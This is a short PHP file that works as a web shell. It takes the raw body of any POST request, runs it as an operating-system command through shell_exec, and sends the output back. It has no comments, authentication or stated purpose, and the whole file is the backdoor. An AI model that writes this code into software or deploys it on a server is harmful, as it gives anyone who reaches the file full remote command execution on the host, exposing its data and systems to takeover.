<?php 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $cmd = file_get_contents('php://input');
  $output = shell_exec($cmd);
  echo $output;
}
?>
